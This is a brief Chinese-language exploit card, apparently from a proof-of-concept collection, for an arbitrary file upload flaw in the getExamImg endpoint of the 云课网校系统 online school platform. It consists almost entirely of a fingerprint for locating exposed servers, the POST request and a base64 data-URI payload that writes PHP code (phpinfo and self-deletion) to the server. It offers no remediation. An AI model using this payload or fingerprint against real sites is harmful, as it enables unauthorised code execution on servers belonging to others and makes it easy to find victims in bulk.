# 云课网校系统getExamImg存在任意文件上传漏洞

云课网校系统 ｜ 文件上传 ｜ —
- **指纹**：`body="/static/libs/common/jquery.stickyNavbar.min.js"`
- **请求**：`POST /index/Exam/getExamImg HTTP/1.1`

**Payload**
```
src_data=data:image/php;base64,PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=
```
- **响应特征**：200